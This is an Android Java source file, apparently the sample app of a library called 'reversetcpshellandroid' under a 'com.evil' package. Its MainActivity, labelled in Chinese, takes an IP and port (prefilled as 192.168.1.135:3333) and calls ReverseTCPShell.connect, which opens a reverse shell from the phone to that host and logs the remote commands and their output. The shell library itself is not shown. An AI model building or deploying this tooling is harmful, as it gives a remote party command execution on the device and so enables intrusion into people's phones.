package com.evil.reversetcpshellandroid.sample;

import android.support.v7.app.AppCompatActivity;
import android.os.Bundle;
import android.view.View;
import android.view.ViewGroup;
import android.widget.BaseAdapter;
import android.widget.Button;
import android.widget.EditText;
import android.widget.ListView;
import android.widget.TextView;

import com.evil.reversetcpshellandroid.library.ConnectErrorListener;
import com.evil.reversetcpshellandroid.library.ConnectListener;
import com.evil.reversetcpshellandroid.library.ReverseTCPShell;

import java.util.ArrayList;
import java.util.List;

public class MainActivity extends AppCompatActivity {
    private TextView textView;
    private EditText ipEditText, portEditText;
    private ListView listView;
    List<String> logList = new ArrayList<>();
    private MyAdapter myAdapter;
    private ReverseTCPShell mShell;
    private Button button;

    @Override
    public void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        textView = (TextView) findViewById(R.id.text_view);
        listView = (ListView) findViewById(R.id.list_view);
        button = (Button) findViewById(R.id.button);
        ipEditText = (EditText) findViewById(R.id.ip_edit);
        portEditText = (EditText) findViewById(R.id.port_edit);
        myAdapter = new MyAdapter();
        listView.setAdapter(myAdapter);

        //图方便
        ipEditText.setText("192.168.1.135");
        portEditText.setText("3333");

        init();
    }

    private void init() {
        reset();
        button.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                if (mShell == null) {
                    reset();
                    connect();
                } else {
                    reset();
                }
            }
        });
    }

    private void reset() {
        logList.clear();
        if (mShell != null)
            mShell.stop();
        mShell = null;
        resetView();
    }

    private void resetView() {
        ipEditText.setEnabled(true);
        portEditText.setEnabled(true);
        button.setText("开始连接");
        button.setEnabled(true);
    }

    private void connect() {
        ipEditText.setEnabled(false);
        portEditText.setEnabled(false);
        textView.setText("连接中...");
        button.setText("断开连接");
        button.setEnabled(false);
        doConnect();
    }

    private void doConnect() {
        String ip = ipEditText.getText().toString().trim();
        int port = Integer.valueOf(portEditText.getText().toString().trim());
        ReverseTCPShell.connect(ip, port, new ConnectListener() {
            @Override
            public void connected(ReverseTCPShell shell) {
                mShell = shell;
                button.setEnabled(true);
                addText("成功连接");
            }

            @Override
            public void receiveMessage(String msg) {
                addText("远程:\n" + msg);
            }

            @Override
            public void feedbackMessage(String msg) {
                addText("反馈:\n" + msg);
            }

            @Override
            public void stopped() {
                addText("连接结束");
                mShell = null;
                reset();
            }
        }, new ConnectErrorListener() {
            @Override
            public void error(String msg) {
                reset();
                addText("连接错误\n" + msg);
            }
        });
    }


    public class MyAdapter extends BaseAdapter {
        @Override
        public int getCount() {
            return logList.size() >= 1 ? logList.size() - 1 : 0;
        }

        @Override
        public Object getItem(int position) {
            return position;
        }

        @Override
        public long getItemId(int position) {
            return position;
        }

        @Override
        public View getView(int position, View convertView, ViewGroup parent) {
            TextView textView = new TextView(parent.getContext());
            textView.setTextSize(20f);
            textView.setText(logList.get(position + 1));
            return textView;
        }
    }

    private void addText(String msg) {
        textView.setText(msg);
        logList.add(0, msg);
        myAdapter.notifyDataSetChanged();
    }

}
